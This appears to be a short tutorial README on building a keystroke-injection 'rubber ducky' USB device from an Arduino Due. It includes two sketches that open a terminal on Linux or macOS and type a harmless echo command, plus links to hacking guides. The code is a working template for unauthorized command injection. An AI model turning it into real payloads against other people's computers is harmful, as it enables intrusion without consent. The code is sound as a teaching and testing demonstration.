# Arduino Rubber Ducky

A rubber ducky is a USB device that can be used to execute commands on a computer. Here we will build a rubber ducky using an Arduino Due and a USB cable.

## Perquisites

- Arduino Due
- USB cable
- Arduino IDE

## Keyboard library

To send keystrokes to the computer we will use the Keyboard library ([see docs](https://www.arduino.cc/reference/en/libraries/keyboard/)). This library is not supported by all Arduino boards however. The Arduino Due is one of the boards that support this library.

## open-terminal-linux.ino

This script opens a terminal on Linux and executes a simple command (for german keyboard layout)

```c++
// Import libraries
#include <Keyboard.h>
#include <Keyboard_de_DE.h>

void setup() {
  // Initialize the keyboard for german keyboard layout
  Keyboard.begin(KeyboardLayout_de_DE);
  delay(1000);
  // Press CTRL + ALT + T to open a terminal
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  delay(10);
  Keyboard.releaseAll();
  delay(5000);
  // Type the command to be executed an press enter
  Keyboard.print("echo 'You have been infected'");
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.releaseAll();
  Keyboard.end();
}
void loop() {}
```

## open-terminal-mac.ino

This script opens a terminal on MacOs and executes a simple command (for german keyboard layout)

```c++
// Import libraries
#include <Keyboard.h>
#include <Keyboard_de_DE.h>

void setup() {
  // Initialize the keyboard for german keyboard layout
  Keyboard.begin(KeyboardLayout_de_DE);
  delay(1000);
  // Press CTRL + Space to open spotlight
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  delay(10);
  Keyboard.releaseAll();
  delay(500);
  // Search for and open the terminal
  Keyboard.print("terminal");
  delay(500);
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.releaseAll();
  delay(1000);
  // Type the command to be executed an press enter
  Keyboard.print("echo 'You have been pawned'");
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.releaseAll();
  Keyboard.end();
}
void loop() {}
```

## Links

- [https://null-byte.wonderhowto.com/how-to/hack-macos-with-digispark-ducky-script-payloads-0198555/](https://null-byte.wonderhowto.com/how-to/hack-macos-with-digispark-ducky-script-payloads-0198555/)
- [https://null-byte.wonderhowto.com/how-to/run-usb-rubber-ducky-scripts-super-inexpensive-digispark-board-0198484/](https://null-byte.wonderhowto.com/how-to/run-usb-rubber-ducky-scripts-super-inexpensive-digispark-board-0198484/)
